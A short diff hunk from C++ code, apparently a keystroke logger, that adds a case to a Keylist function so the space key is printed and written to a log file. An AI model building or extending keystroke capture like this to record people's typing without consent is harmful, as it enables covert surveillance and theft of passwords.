@@ -22,3 +22,7 @@ bool Keylist(int iKey){
             cout << "lclick";
             Writelog(" lclick ");
             break;
+		case VK_SPACE:
+            cout << " ";
+            Writelog(" ");
+            break;
